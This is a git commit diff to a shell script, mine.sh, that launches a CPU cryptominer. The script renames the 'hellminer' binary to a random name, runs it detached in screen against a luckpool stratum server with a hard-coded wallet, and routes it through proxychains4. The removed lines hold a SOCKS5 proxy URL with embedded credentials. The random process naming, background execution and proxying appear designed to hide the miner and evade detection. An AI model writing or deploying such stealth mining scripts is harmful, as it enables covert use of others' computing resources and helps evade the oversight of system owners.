b8054d291cd586c920f6f6efb60120a280fed2c5
cvayoyo <145971481+Cvayoyo@users.noreply.github.com>
2026-04-28 15:02:06 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,5 +1,4 @@
-proxy_url="socks5://tykQ7b:qxmTUk@95.164.245.175:9864"
 random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)
 mv hellminer $random_name
 chmod +x $random_name
-screen -d -m bash -c "./$random_name -c stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p x --cpu 6 --proxy=$proxy_url"
+screen -d -m bash -c "proxychains4 ./$random_name -c stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p x --cpu 6"
